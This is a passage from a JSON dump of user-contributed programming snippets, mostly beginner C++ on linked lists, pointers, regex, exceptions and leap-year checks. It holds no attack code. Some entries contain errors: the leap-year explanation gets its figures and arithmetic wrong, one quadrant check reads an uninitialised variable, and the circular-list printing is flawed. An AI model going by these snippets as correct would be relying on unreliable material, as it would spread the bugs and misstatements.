    "reg_date": "2021-10-12T11:36:38.000Z"
  },
  {
    "id": 139,
    "keyword": null,
    "link": null,
    "title": " C++ linked list",
    "description": "#include <iostream>  using namespace std;  struct node {     int data;     node *next; };  class linked_list { private:     node *head,*tail; public:     linked_list()     {         head = NULL;         tail = NULL;     }      void add_node(int n)     {         node *tmp = new node;         tmp->data = n;         tmp->next = NULL;          if(head == NULL)         {             head = tmp;             tail = tmp;         }         else         {             tail->next = tmp;             tail = tail->next;         }     } };  int main() {     linked_list a;     a.add_node(1);     a.add_node(2);     return 0; }\nclass ListNode:     def __init__(self, value, prev=None, next=None):         self.prev = prev         self.value = value         self.next = next  class DoublyLinkedList:     def __init__(self, node=None):         self.head = node         self.tail = node         self.length = 1 if node is not None else 0      def __len__(self):         return self.length       \tdef add_to_head(self, value):         new_node = ListNode(value, None, None)         self.length += 1         if not self.head and not self.tail:             self.head = new_node             self.tail = new_node         else:             new_node.next = self.head             self.head.prev = new_node             self.head = new_node       def remove_from_head(self):         value = self.head.value         self.delete(self.head)         return value      def add_to_tail(self, value):         new_node = ListNode(value, None, None)         self.length += 1         if not self.tail and not self.head:             self.tail = new_node             self.head = new_node         else:             new_node.prev = self.tail             self.tail.next = new_node             self.tail = new_node                   def remove_from_tail(self):         value = self.tail.value         self.delete(self.tail)         return value                  def move_to_front(self, node):         if node is self.head:             return         value = node.value         if node is self.tail:             self.remove_from_tail()         else:             node.delete()             self.length -= 1         self.add_to_head(value)              def move_to_end(self, node):         if node is self.tail:             return         value = node.value         if node is self.head:             self.remove_from_head()             self.add_to_tail(value)         else:             node.delete()             self.length -= 1             self.add_to_tail(value)      def delete(self, node):         self.length -= 1         if not self.head and not self.tail:             return         if self.head == self.tail:             self.head = None             self.tail = None         elif self.head == node:             self.head = node.next             node.delete()         elif self.tail == node:             self.tail = node.prev             node.delete()         else:             node.delete()      def get_max(self):         if not self.head:             return None         max_val = self.head.value         current = self.head         while current:             if current.value > max_val:                 max_val = current.value             current = current.next         return max_val\n #include <bits/stdc++.h> #include <iostream> #include <list> #include <iterator>  #define ll long long  using namespace std;  //function to print all the elements of the linked list void showList(list <int> l){ \tlist <int> :: iterator it; //create an iterator according to the data structure \tfor(it = l.begin(); it != l.end(); it++){ \t\tcout<<*it<<\" \"; \t} \t }\t   int main(){ \t \tlist <int> l1; \tlist <int> l2; \t \tfor(int i=0; i<10; i++){ \t\tl1.push_back(i*2); //fill list 1 with multiples of 2 \t\tl2.push_back(i*3); //fill list 2 with multiples of 3 \t} \t \tcout<<\"content of list 1 is \"<<endl; \tshowList(l1); \tcout<<endl; \t \tcout<<\"content of list 2 is \"<<endl; \tshowList(l2); \tcout<<endl; \t \t//reverse the first list \tl1.reverse(); \tshowList(l1); \tcout<<endl; \t \t//sort the first list \tl1.sort(); \tshowList(l1); \tcout<<endl; \t \t//removing an element from both sides \tl2.pop_front(); \tl2.pop_back(); \t \t//adding an element from both sides \tl2.push_back(10); \tl2.push_front(20); \t \t     return 0; }\n// Java code to illustrate listIterator()  import java.io.*;  import java.util.LinkedList;  import java.util.ListIterator;     public class LinkedListDemo {      public static void main(String args[])      {          // Creating an empty LinkedList          LinkedList<String> list = new LinkedList<String>();             // Use add() method to add elements in the list          list.add(\"Geeks\");          list.add(\"for\");          list.add(\"Geeks\");          list.add(\"10\");          list.add(\"20\");             // Displaying the linkedlist          System.out.println(\"LinkedList:\" + list);                     // Setting the ListIterator at a specified position          ListIterator list_Iter = list.listIterator(2);             // Iterating through the created list from the position          System.out.println(\"The list is as follows:\");          while(list_Iter.hasNext()){             System.out.println(list_Iter.next());          }      }  } \nstruct Node {   int data;   struct Node *next; };\n/**  * Definition for singly-linked list.  * struct ListNode {  *     int val;  *     ListNode *next;  *     ListNode(int x) : val(x), next(NULL) {}  * };  */  void trimLeftTrailingSpaces(string &input) {     input.erase(input.begin(), find_if(input.begin(), input.end(), [](int ch) {         return !isspace(ch);     })); }  void trimRightTrailingSpaces(string &input) {     input.erase(find_if(input.rbegin(), input.rend(), [](int ch) {         return !isspace(ch);     }).base(), input.end()); }  vector<int> stringToIntegerVector(string input) {     vector<int> output;     trimLeftTrailingSpaces(input);     trimRightTrailingSpaces(input);     input = input.substr(1, input.length() - 2);     stringstream ss;     ss.str(input);     string item;     char delim = ',';     while (getline(ss, item, delim)) {         output.push_back(stoi(item));     }     return output; }  ListNode* stringToListNode(string input) {     // Generate list from the input     vector<int> list = stringToIntegerVector(input);      // Now convert that list into linked list     ListNode* dummyRoot = new ListNode(0);     ListNode* ptr = dummyRoot;     for(int item : list) {         ptr->next = new ListNode(item);         ptr = ptr->next;     }     ptr = dummyRoot->next;     delete dummyRoot;     return ptr; }  void prettyPrintLinkedList(ListNode* node) {   while (node && node->next) {       cout << node->val << \"->\";       node = node->next;   }    if (node) {     cout << node->val << endl;   } else {     cout << \"Empty LinkedList\" << endl;   } }  int main() {     string line;     while (getline(cin, line)) {         ListNode* head = stringToListNode(line);         prettyPrintLinkedList(head);     }     return 0; }\n",
    "reg_date": "2021-10-12T11:36:38.000Z"
  },
  {
    "id": 140,
    "keyword": null,
    "link": null,
    "title": " C++ loop maker",
    "description": "1 12 123 1234 12345\n",
    "reg_date": "2021-10-12T11:36:38.000Z"
  },
  {
    "id": 141,
    "keyword": null,
    "link": null,
    "title": " C++ multiply",
    "description": "// Program to multiply 2 numbers from user inputs  #include <iostream> using namespace std;  int main() {     double firstNumber, secondNumber, productOfTwoNumbers;     cout << \"Enter two numbers: \";      // Stores two floating point numbers in variable firstNumber and secondNumber respectively     cin >> firstNumber >> secondNumber;       // Performs multiplication and stores the result in variable productOfTwoNumbers     productOfTwoNumbers = firstNumber * secondNumber;        cout << \"Product = \" << productOfTwoNumbers;              return 0; }\n",
    "reg_date": "2021-10-12T11:36:39.000Z"
  },
  {
    "id": 142,
    "keyword": null,
    "link": null,
    "title": " C++ pointer arithmetic",
    "description": "#include <iostream>  using namespace std; const int MAX = 3;  int main () {    int  var[MAX] = {10, 100, 200};    int  *ptr;     // let us have array address in pointer.    ptr = var;        for (int i = 0; i < MAX; i++) {       cout << \"Address of var[\" << i << \"] = \";       cout << ptr << endl;        cout << \"Value of var[\" << i << \"] = \";       cout << *ptr << endl;        // point to the next location       ptr++;    }        return 0; }\n#include <stdio.h>  const int MAX = 3;  int main () {     int  var[] = {10, 100, 200};    int  i, *ptr;     /* let us have array address in pointer */    ptr = &var[MAX-1]; \t    for ( i = MAX; i > 0; i--) {        printf(\"Address of var[%d] = %x\\n\", i-1, ptr );       printf(\"Value of var[%d] = %d\\n\", i-1, *ptr );        /* move to the previous location */       ptr--;    } \t    return 0; }\n",
    "reg_date": "2021-10-12T11:36:39.000Z"
  },
  {
    "id": 143,
    "keyword": null,
    "link": null,
    "title": " C++ pointer to base class",
    "description": "#include <cstdlib> #include <ctime> #include <iostream> #include <vector>  class Parent { public:     virtual void sayHi()     {         std::cout << \"Parent here!\" << std::endl;     } };  class Child : public Parent { public:     void sayHi()     {         std::cout << \"Child here!\" << std::endl;     } };  class DifferentChild : public Parent { public:     void sayHi()     {         std::cout << \"DifferentChild here!\" << std::endl;     } };  int main() {     std::vector<Parent*> parents;      // Add 10 random children     srand(time(NULL));     for (int i = 0; i < 10; ++i) {         int child = rand() % 2; // random number 0-1         if (child) // 1             parents.push_back(new Child);         else             parents.push_back(new DifferentChild);     }      // Call sayHi() for each type! (example of polymorphism)     for (const auto& child : parents) {         child->sayHi();     }      return 0; }\n",
    "reg_date": "2021-10-12T11:36:39.000Z"
  },
  {
    "id": 144,
    "keyword": null,
    "link": null,
    "title": " C++ pointer to incomplete class type is not allowed unreal",
    "description": "#include \"Components/InputComponent.h\" on .cpp   \n",
    "reg_date": "2021-10-12T11:36:39.000Z"
  },
  {
    "id": 145,
    "keyword": null,
    "link": null,
    "title": " C++ prime number check",
    "description": "// 6k+-1 optimisation bool is_prime6(int num) {   int i;   if (num == 1)     return false;   if (num <= 3)     return true;   if (num % 2 == 0 || num % 3 == 0)     return false;   if (num < 25)     return true;   for (i = 5; i * i <= num; i += 6)     if (num % i == 0 || num % (i + 2) == 0)       return false;   return true; }\n",
    "reg_date": "2021-10-12T11:36:39.000Z"
  },
  {
    "id": 146,
    "keyword": null,
    "link": null,
    "title": " C++ program to demonstrate the regex replace() function.",
    "description": "#include <iostream>  #include <string>  #include <regex>  #include <iterator>  using namespace std;      int main()  {       string mystr = \"This is software testing Help portal \\n\";            cout<<\"Input string: \"<<mystr<<endl;             // regex to match string beginning with 'p'      regex regexp(\"p[a-zA-z]+\");      cout<<\"Replace the word 'portal' with word 'website' : \";      // regex_replace() for replacing the match with the word 'website'       cout << regex_replace(mystr, regexp, \"website\");            string result;              cout<<\"Replace the word 'website' back to 'portal': \";     // regex_replace( ) for replacing the match back with 'portal'      regex_replace(back_inserter(result), mystr.begin(), mystr.end(),                    regexp,  \"portal\");          cout << result;          return 0;  } \n",
    "reg_date": "2021-10-12T11:36:39.000Z"
  },
  {
    "id": 147,
    "keyword": null,
    "link": null,
    "title": " C++ remove element from set",
    "description": "std::set<int> s {1,2,3}; s.erase(2);\n",
    "reg_date": "2021-10-12T11:36:39.000Z"
  },
  {
    "id": 148,
    "keyword": null,
    "link": null,
    "title": " C++ remove last element from array",
    "description": "vector.pop_back();\nNot Possible because C++ array has fixed size\n",
    "reg_date": "2021-10-12T11:36:39.000Z"
  },
  {
    "id": 149,
    "keyword": null,
    "link": null,
    "title": " C++ sfinae",
    "description": "/* \"Substitution Failure Is Not An Error\"  This rule applies during overload resolution of function templates: When substituting the explicitly specified or deduced type for the template parameter fails, the specialization is discarded from the overload set instead of causing a compile error.  This feature is used in template metaprogramming. STL features like std::enable_if use SFINAE */\n",
    "reg_date": "2021-10-12T11:36:39.000Z"
  },
  {
    "id": 150,
    "keyword": null,
    "link": null,
    "title": " C++ shortcuts in desktopp app",
    "description": "// I know, the video is on C#, but C++ and C# haven't got a lot of difference. //watch the video: https://www.youtube.com/watch?v=ddc1lTBrejQ // THE video is not mine!!! // if Keys.K is not working use: e->KeyValue == 0x1B //0x1B is a value of ESC //work only in DESKTOP APP :NET FRAMEWOREK (I used .net framework 4.7.2)\n",
    "reg_date": "2021-10-12T11:36:39.000Z"
  },
  {
    "id": 151,
    "keyword": null,
    "link": null,
    "title": " C++ sqlite open file in other directory",
    "description": "int main(){      sqlite3* db; // Pointer to SQLite connection   const char* sqlFilename = \"C:/Users/database.sqlite\";//the path to your sqlite   int error = sqlite3_open(sqlFilename, &db); //opening conection   if(error){       //if error then display error and close conection       std::cout << \"DB Open Error: \" << sqlite3_errmsg(db) << std::endl;       sqlite3_close(db);       return 1;   }   else {       std::cout << \"Opened Database Successfully!\" << std::endl;   }   return 0; }\n",
    "reg_date": "2021-10-12T11:36:40.000Z"
  },
  {
    "id": 152,
    "keyword": null,
    "link": null,
    "title": " C++ ss",
    "description": " stringstream ss;  string numberStr = \"654321\"; int num; ss << numberStr;  ss >> num;  cout << \"str type:\" << numberStr <<endl; cout << \"convert to num:\" << num <<endl;\n",
    "reg_date": "2021-10-12T11:36:40.000Z"
  },
  {
    "id": 153,
    "keyword": null,
    "link": null,
    "title": " C++ std::count function",
    "description": "// count algorithm example #include <iostream>     // std::cout #include <algorithm>    // std::count #include <vector>       // std::vector  int main () {   // counting elements in array:   int myints[] = {10,20,30,30,20,10,10,20};   // 8 elements   int mycount = std::count (myints, myints+8, 10);   std::cout << \"10 appears \" << mycount << \" times.\\n\";    // counting elements in container:   std::vector<int> myvector (myints, myints+8);   mycount = std::count (myvector.begin(), myvector.end(), 20);   std::cout << \"20 appears \" << mycount  << \" times.\\n\";    return 0; }\n",
    "reg_date": "2021-10-12T11:36:40.000Z"
  },
  {
    "id": 154,
    "keyword": null,
    "link": null,
    "title": " C++ std::string find and replace",
    "description": "#include <string> #include <regex>  using std::string;  string do_replace( string const & in, string const & from, string const & to ) {   return std::regex_replace( in, std::regex(from), to ); }  string test = \"Remove all spaces\"; std::cout << do_replace(test, \" \", \"\") << std::endl; \n",
    "reg_date": "2021-10-12T11:36:40.000Z"
  },
  {
    "id": 155,
    "keyword": null,
    "link": null,
    "title": " C++ stl vector basic",
    "description": " #include <iostream> #include <vector> using namespace std;  int main() {     vector<int> v;     vector<int> a(5,1);     vector<int> last(a);     cout<<\"Print last\"<<endl;     for(int i:last){         cout<<i<<\" \";     }cout<<endl;     cout<<\"capacity \"<<v.capacity()<<endl;     v.push_back(1);     cout<<\"capacity \"<<v.capacity()<<endl;     v.push_back(2);     cout<<\"capacity \"<<v.capacity()<<endl;     v.push_back(3);     cout<<\"capacity \"<<v.capacity()<<endl;     cout<<\"size \"<<v.size()<<endl;     cout<<\"Element at second index \"<<v.at(2)<<endl;     cout<<\"front \"<<v.front()<<endl;     cout<<\"back \"<<v.back()<<endl;          }  \n",
    "reg_date": "2021-10-12T11:36:40.000Z"
  },
  {
    "id": 156,
    "keyword": null,
    "link": null,
    "title": " C++ string format ctime",
    "description": "#include <ctime> #include <iostream> using namespace std;  int main() { \ttime_t curr_time; \ttm * curr_tm; \tchar date_string[100]; \tchar time_string[100]; \t \ttime(&curr_time); \tcurr_tm = localtime(&curr_time); \t \tstrftime(date_string, 50, \"Today is %B %d, %Y\", curr_tm); \tstrftime(time_string, 50, \"Current time is %T\", curr_tm); \t \tcout << date_string << endl; \tcout << time_string << endl; \t \treturn 0; }\n",
    "reg_date": "2021-10-12T11:36:40.000Z"
  },
  {
    "id": 157,
    "keyword": null,
    "link": null,
    "title": " C++ string initialization",
    "description": "string s0;                                       // s0 = &ldquo;&rdquo; string s1(&ldquo;Hello&rdquo;);                               // s1 = &ldquo;Hello&rdquo; string s2 (s1);                                  // s2 = &ldquo;Hello&rdquo; string s3 (s1, 1, 2);                            // s3 = &ldquo;el&rdquo; string s4 (\"Hello World\", 5);                     // s4 = &ldquo;Hello&rdquo; string s5 (5, &lsquo;*&rsquo;);                              // s5 = &ldquo;*****&rdquo; string s6 (s1.begin(), s1.begin()+3);              // s6 = &ldquo;Hel&rdquo;\n",
    "reg_date": "2021-10-12T11:36:40.000Z"
  },
  {
    "id": 158,
    "keyword": null,
    "link": null,
    "title": " C++ sudoku solver",
    "description": "Take a look at 2 of the most effective methods at: https://github.com/Elementrix08/Sudoku\n",
    "reg_date": "2021-10-12T11:36:40.000Z"
  },
  {
    "id": 159,
    "keyword": null,
    "link": null,
    "title": " C++ sum a vector of digits",
    "description": "accumulate(a.begin(), a.end(), 0);\n // Sum digits in vector int digit_sum(vector<int> num) {     int sum = 0;     for (auto x : num) sum += x;     return sum; }\n",
    "reg_date": "2021-10-12T11:36:40.000Z"
  },
  {
    "id": 160,
    "keyword": null,
    "link": null,
    "title": " C++ sum the digits of an integer",
    "description": "int x, s = 0;    cout << \"Enter the number : \";    cin >> x;    while (x != 0) {       s = s + x % 10;       x = x / 10;    }\n// sum the digits of an integer int getSum(long long n) {   int sum = 0;   int m = n;   while(n > 0) {         m = n % 10;         sum = sum + m;         n = n / 10;       }    return sum; }\n// Method 1: Mathematical -> Sum up numbers from 1 to n  int sum(int n){ \treturn (n * (n+1)) / 2; }  // Method 2: Using a for-loop -> Sum up numbers from 1 to n  int sum(int n){ \tint tempSum = 0;    \tfor (int i = n; i > 0; i--){      \ttempSum += i;       }   \treturn tempSum;  }  // Method 3: Using recursion -> Sum up numbers from 1 to n  int sum(int n){ \treturn n > 0 ? n + sum(n-1) : 0;  }\n#include <iostream> #include <math.h> // \"#include <math.h> isn't needed. using namespace std; /* run this program using the console pauser or add your own getch, system(\"pause\") or input loop */  int main(int argc, char** argv) { \t// Sum of numbers in a group under a given number. \tcout << \"Insert four numbers:\" << endl; \t// In this case the numbers I chose to use are four but you can use how many you want. \tfloat a, b, c, d; \tcin >> a >> b >> c >> d; \tfloat aa, bb, cc, dd; \t// The second set of variables must have the same number of variables of the numbers \t// you want to sum. \tif(a < 8){ \t// In this case \"n\" is replaced by 8, but, again, you can use any number you prefer. \t\taa = a; \t\tif(b < 8){ \t\t\tbb = b; \t\t\tif(c < 8){ \t\t\t\tcc = c; \t\t\t\tif(d < 8){ \t\t\t\t\tdd = d; \t\t\t\t} else { \t\t\t\t\tdd = 0; \t\t\t\t} \t\t\t} else { \t\t\t\tcc = 0; \t\t\t\tif(d < 8){ \t\t\t\t\tdd = d; \t\t\t\t} else { \t\t\t\t\tdd = 0; \t\t\t\t} \t\t\t} \t\t} else { \t\t\tbb = 0; \t\t\tif(c < 8){ \t\t\t\tcc = c; \t\t\t\tif(d < 8){ \t\t\t\t\tdd = d; \t\t\t\t} else { \t\t\t\t\tdd = 0; \t\t\t\t} \t\t\t} else { \t\t\t\tcc = 0; \t\t\t\tif(d < 8){ \t\t\t\t\tdd = d; \t\t\t\t} else { \t\t\t\t\tdd = 0; \t\t\t\t} \t\t\t} \t\t} \t} else { \t\taa = 0; \t\tif(b < 8){ \t\t\tbb = b; \t\t\tif(c < 8){ \t\t\t\tcc = c; \t\t\t\tif(d < 8){ \t\t\t\t\tdd = d; \t\t\t\t} else { \t\t\t\t\tdd = 0; \t\t\t\t} \t\t\t} else { \t\t\t\tcc = 0; \t\t\t\tif(d < 8){ \t\t\t\t\tdd = d; \t\t\t\t} else { \t\t\t\t\tdd = 0; \t\t\t\t} \t\t\t} \t\t} else { \t\t\tbb = 0; \t\t\tif(c < 8){ \t\t\t\tcc = c; \t\t\t\tif(d < 8){ \t\t\t\t\tdd = d; \t\t\t\t} else { \t\t\t\t\tdd = 0; \t\t\t\t} \t\t\t} else { \t\t\t\tcc = 0; \t\t\t\tif(d < 8){ \t\t\t\t\tdd = d; \t\t\t\t} else { \t\t\t\t\tdd = 0; \t\t\t\t} \t\t\t} \t\t} \t} \tcout << endl << \"Sum of the numbers lower than n (8): \" << aa+bb+cc+dd << endl; \t// Basically this associates each number to a variable of the second group and \t// then, through if, it sees which numbers are under n. \t// If they are under n the second variable is given the same numeric value as \t// its respective number, if not its value is equal to 0. \t// It then sums the variables together. \t// To have more/less numbers you add the respective variables, then make two \t// cases where the number is higher or lower than n. Then, you copy-paste \t// the two if chains underneath. \treturn 0; }\n",
    "reg_date": "2021-10-12T11:36:41.000Z"
  },
  {
    "id": 161,
    "keyword": null,
    "link": null,
    "title": " C++ try catch",
    "description": "try {    //do something } catch (const std::exception& e) {      std::cout << e.what(); // information from error printed }\n#include <stdexcept> #include <limits> #include <iostream>  using namespace std;  void MyFunc(int c) {     if (c > numeric_limits< char> ::max())         throw invalid_argument(\"MyFunc argument too large.\");     //... }\ntry { \t//do } catch (...){ \t//if error do }\n// exceptions #include <iostream> using namespace std;  int main () {   try   {     throw 20;   }   catch (int e)   {     cout << \"An exception occurred. Exception Nr. \" << e << '\\n';   }   return 0; }\n",
    "reg_date": "2021-10-12T11:36:41.000Z"
  },
  {
    "id": 162,
    "keyword": null,
    "link": null,
    "title": " C++ user input",
    "description": "#include <iostream> int main(){   std::string firstname; //variable created as a string   std::cout << \"What's your first name\\n\";   std::cin >> firstname;//asking for the users' first name   std:: cout << \"Hello \" << firstname } //Works for anyone, don't need any packages, just type this is in and run it.\nint x;  cout << \"hurry, give me a number!: \"; // Type a number and press enter cin >> x; // Get user input from the keyboard cout << \"you picked: \" << x << \" !\" // Display the input value  OR use: getline >> (cin, variable-name); instead of  cin >> x;    \n",
    "reg_date": "2021-10-12T11:36:41.000Z"
  },
  {
    "id": 163,
    "keyword": null,
    "link": null,
    "title": " C++ with SVD",
    "description": "   int main(int argc, char* argv[])     {         // Image matrix         Mat img;         Mat result;         //---------------------------------------------         //         //---------------------------------------------         namedWindow(\"Source Image\");          namedWindow(\"Result\");         // Load image in grayscale mode         img=imread(\"D:\\\\ImagesForTest\\\\cat.bmp\",0);         img.convertTo(img,CV_32FC1,1.0/255.0);         cout << \"Source size:\" << img.rows*img.cols <<\" elements \"<< endl;         // create SVD          cv::SVD s;         // svd result         Mat w,u,vt;         // computations ...         s.compute(img,w,u,vt);          // collect Sigma matrix (diagonal - is eigen values, other - zeros)         // we got it in as vector, transform it to diagonal matrix         Mat W=Mat::zeros(w.rows,w.rows,CV_32FC1);                for(int i=0;i<w.rows;i++)         {             W.at<float>(i,i)=w.at<float>(i);         }          // reduce rank to k         int k=25;         W=W(Range(0,k),Range(0,k));         u=u(Range::all(),Range(0,k));         vt=vt(Range(0,k),Range::all());          // Get compressed image         result=u*W*vt;         cout << \"Result size:\" << u.rows*u.cols+k+vt.rows*vt.cols <<\" elements \"<< endl;         //---------------------------------------------         //         //---------------------------------------------          imshow(\"Source Image\", img);         imshow(\"Result\", result);         cvWaitKey(0);         return 0;     } \n",
    "reg_date": "2021-10-12T11:36:41.000Z"
  },
  {
    "id": 164,
    "keyword": null,
    "link": null,
    "title": " C code to MIPS assembly converter online",
    "description": "#include <iostream>\n#include <iostream>   using namespace std;   int main(void) {     int n1=0,n2=1,n3,i,number,num,a,b,opt,x,y;   cout<<\"enter your option\";   cin>>opt; if(opt==1){  cout<<\"Enter the number of elements: \";      cin>>number;      cout<<n1<<\" \"<<n2<<\" \"; //printing 0 and 1      for(i=2;i<number;++i) //loop starts from 2 because 0 and 1 are already printed      {       n3=n1+n2;       cout<<n3<<\" \";       n1=n2;       n2=n3;   } } else if(opt==2) {    for( a = 1; a <= 5; ++a)     {         for( b = 1; b <= a; ++b)         {             cout << \"* \";         }         cout << \"\\n\";     }   } else if(opt==3){       cout<<\"Enter X coordinate\";         cin>>x;         cout<<\"Enter y coordinate\";                           //checking for quadrants and axis         if(x==0)             cout<< \"lies on y axis\";         else if(y==0)             cout<< \"lies on x axis\";         else if(x>0&&y>0)             cout<< \"lies in 1st quadrant\";         else if(x<0&&y>0)             cout<<\"lies in 2nd quadrant\";         else if(x<0&&y<0)             cout<<\"lies in 3rd quadrant\";         else if(x>0&&y<0)             cout<<\"lies in 4th quadrant\";         else             cout<<\"lies on the origin\";         }         return 0;        }\nfor (i=1; i<=N; i++) { a[i] = c[i]*16; }\nint i=0, j=0, k=2; while(i==j){ i++; j++; if(i>>2==k)  j=0;  } \nint myHack (int x) {     int i=100;     int y=50;     while (i>0){         if (y<100) {             y = y * 2;         }else{             y = func(x, y);             x++;         }         i--;     }     return y; }\n# Not sure what to do now? Enter your mips code here \n",
    "reg_date": "2021-10-12T11:36:41.000Z"
  },
  {
    "id": 165,
    "keyword": null,
    "link": null,
    "title": " C if",
    "description": "if (condition) {      //Block of C statements here      //These statements will only execute if the condition is true }\n#include <studio.h> int main() {   if (logic goes here)   {     CODE   }   else if (logic)   {     CODE   }   else{     CODE   }   return 0 }\nif (<condition>) { \t<code> } else if (<condition>) { \t<code> } else { \t<code> }  /* example */ int money = 50; if (money < 15) { \tgo_home(); } else if (money >= 600) { \tbuy_all(); } else { \tbuy_tickets(money / 15); }  /* You can chain together as many else ifs as you want. But if there are too many it will make the code hard to understand. In that case I would  recommend trying other solutions. */\nif ( TRUE ) {     /* Execute these statements if TRUE */ } else {     /* Execute these statements if FALSE */ } \nif (false){ } else{ } return 0;\nif (test expression1) {    // statement(s) } else if(test expression2) {    // statement(s) } else if (test expression3) {    // statement(s) } . . else {    // statement(s) }\n",
    "reg_date": "2021-10-12T11:36:41.000Z"
  },
  {
    "id": 166,
    "keyword": null,
    "link": null,
    "title": " C map check if key exists",
    "description": "if ( m.find(\"f\") == m.end() ) {   // not found } else {   // found }\n",
    "reg_date": "2021-10-12T11:36:41.000Z"
  },
  {
    "id": 167,
    "keyword": null,
    "link": null,
    "title": " Can you add a constructor to an abstract class",
    "description": "We can create constructor in abstract class , it does&rsquo;nt give any compilation  error. \n",
    "reg_date": "2021-10-12T11:36:41.000Z"
  },
  {
    "id": 168,
    "keyword": null,
    "link": null,
    "title": " Capacity string c++",
    "description": "#include <iostream> #include <string> using namespace std; main () {   string str (\"Test string\");   cout << \"size: \" << str.size() << \"\\n\";   cout << \"length: \" << str.length() << \"\\n\";   cout << \"capacity: \" << str.capacity() << \"\\n\";   cout << \"max_size: \" << str.max_size() << \"\\n\"; } /* size: 11 length: 11 capacity: 15 max_size: 429496729 */\n",
    "reg_date": "2021-10-12T11:36:41.000Z"
  },
  {
    "id": 169,
    "keyword": null,
    "link": null,
    "title": " Character cin(userInput) in c++",
    "description": "char c[10];     cin.getline(c,10);\n",
    "reg_date": "2021-10-12T11:36:42.000Z"
  },
  {
    "id": 170,
    "keyword": null,
    "link": null,
    "title": " Character convert c++",
    "description": "tolower(character) - Convert uppercase letter to lowercase toupper(character) - Convert lowercase letter to uppercase\n",
    "reg_date": "2021-10-12T11:36:42.000Z"
  },
  {
    "id": 171,
    "keyword": null,
    "link": null,
    "title": " Check Leap Year",
    "description": "#include <iostream> using namespace std;  int main() {     int year;     cout << \"Enter a year: \";     cin >> year;     if (year % 4 == 0) {         if (year % 100 == 0) {             (year % 400 == 0) ?             cout << year << \" is a leap year.\" :             cout << year << \" is not a leap year.\";         }         else             cout << year << \" is a leap year.\";     }     else         cout << year << \" is not a leap year.\";     return 0; }\nI'll simplfy this. Humans cut every year 6 hours short (1/4 of a day[it is actually less than 1/4 but see below for the rest]). This means that every 4 years, 24 hours have been lost and to make up for that, we just add the 24 hours to a much shorter month (like february - 28d) giving us the 'leap year' and making the year 1 day longer.   This is to keep up with the astronomical years which the western calender is based off of, in which the terrarial 'lap' of the sun is the equivilant of 265.24 full rotations of the earth (day/night cycles). The reason we don't measure individual years in 365.24 earth rotations is because we would end up having a super long day at the end of the year and then days would end up being dark or light depending on the year and it would all get in a  big muddle. Instead, we keep the calendar normal and just remove the .24 of  a day off every 3 years, only to add all the lost time together and make another day every four years (or every leap year). You may have noticed that 4x0.24 is actually not 100 but 0.96, so surely after 100 years, we would miss a day? Well actually, in the year 2000, we did still have a leap year because it is a multiple of 400(a leap century if you will), but every other 100 years, we do not have an extra day because of that 0.24.\nif (((year % 4 == 0) && (year % 100 != 0)) || (year % 400 == 0)) cout<<year<<\" is a leap year\"; else cout<<year<<\" is not a leap year\";\nimport calendar  def is_leap(year):     return calendar.isleap(year) \n",
    "reg_date": "2021-10-12T11:36:42.000Z"
  },
  {
    "id": 172,
    "keyword": null,
    "link": null,
    "title": " Check if linked list is palindrome or not?",
    "description": "#include<bits/stdc++.h>   using namespace std;   // Declaration of a single Node class Node { public:         int data;         Node(int d){             data = d;         }         Node *ptr; };   // Function that returns boolean value bool isPalin(Node* head){                  // Temp pointer         Node* slow= head;           // Create a stack         stack <int> s;             // First traversal to push all the elements to stack         while(slow != NULL){                 s.push(slow->data);                 slow = slow->ptr;         }           // Second Traversal to compare the stack and node         while(head != NULL ){                          int i=s.top();             s.pop();               // Compare data             if(head -> data != i){                 return false;             }         head=head->ptr;         }   return true; }   // Driver Function int main(){     // Create nodes     Node one = Node(31);     Node two = Node(32);     Node three = Node(33);     Node four = Node(34);     Node five = Node(35);       // Connect all the nodes     five.ptr = NULL;     one.ptr = &two;     two.ptr = &three;     three.ptr = &four;     four.ptr = &five;     Node* temp = &one;            // Call function to return bool if the list is palindrome or not     int result = isPalin(&one);       if(result == 1)             cout<<\"The value is True\\n\";     else         cout<<\"The value is False\\n\";   return 0; }\n",
    "reg_date": "2021-10-12T11:36:42.000Z"
  },
  {
    "id": 173,
    "keyword": null,
    "link": null,
    "title": " Check the below program to demonstrate how you can use the regex to validate incoming data.",
    "description": "#include <iostream> #include <regex> #include <string> using namespace std;    int main() {     string input;     regex integer_expr(\"(\\\\+|-)?[[:digit:]]+\");     //As long as the input is correct ask for another number     while(true)     {         cout<<\"Enter the input: \";         cin>>input;         if(!cin) break;         //Exit when the user inputs q         if(input==\"q\")             break;         if(regex_match(input,integer_expr))             cout<<\"Input is an integer\"<<endl;         else         {cout<<\"Invalid input : Not an integer\"<<endl;}     } } \n",
    "reg_date": "2021-10-12T11:36:42.000Z"
  },
  {
    "id": 174,
    "keyword": null,
    "link": null,
    "title": " Check whether K-th bit is set or not c++",
    "description": "void isKthBitSet(int n, int k) {     if (n & (1 << (k - 1)))         cout << \"SET\";     else         cout << \"NOT SET\"; }\nn & (1 << (k - 1)) (n >> (k - 1)) & 1\n",
    "reg_date": "2021-10-12T11:36:42.000Z"
  },
  {
    "id": 175,
    "keyword": null,
    "link": null,
    "title": " Check whether the jth object is in the subset",
    "description": "S = A & (1 << j) If S = 0, then the j-th item of the set is off. If S != 0 (to be precise, T = (1 << j)), then the j-th item of the set is on.\n",
    "reg_date": "2021-10-12T11:36:42.000Z"
  },
  {
    "id": 176,
    "keyword": null,
    "link": null,
    "title": " Circular Linked List in c++",
    "description": "#include <stdio.h> #include <string.h> #include <stdlib.h> #include <stdbool.h>  struct node {    int data;    int key; \t    struct node *next; };  struct node *head = NULL; struct node *current = NULL;  bool isEmpty() {    return head == NULL; }  int length() {    int length = 0;     //if list is empty    if(head == NULL) {       return 0;    }     current = head->next;     while(current != head) {       length++;       current = current->next;       } \t    return length; }  //insert link at the first location void insertFirst(int key, int data) {     //create a link    struct node *link = (struct node*) malloc(sizeof(struct node));    link->key = key;    link->data = data; \t    if (isEmpty()) {       head = link;       head->next = head;    } else {       //point it to old first node       link->next = head; \t\t       //point first to new first node       head = link;    }     }  //delete first item struct node * deleteFirst() {     //save reference to first link    struct node *tempLink = head; \t    if(head->next == head) {         head = NULL;       return tempLink;    }          //mark next to first link as first     head = head->next; \t    //return the deleted link    return tempLink; }  //display the list void printList() {     struct node *ptr = head;    printf(\"\\n[ \"); \t    //start from the beginning    if(head != NULL) { \t       while(ptr->next != ptr) {               printf(\"(%d,%d) \",ptr->key,ptr->data);          ptr = ptr->next;       }    } \t    printf(\" ]\"); }  void main() {    insertFirst(1,10);    insertFirst(2,20);    insertFirst(3,30);    insertFirst(4,1);    insertFirst(5,40);    insertFirst(6,56);      printf(\"Original List: \");  \t    //print list    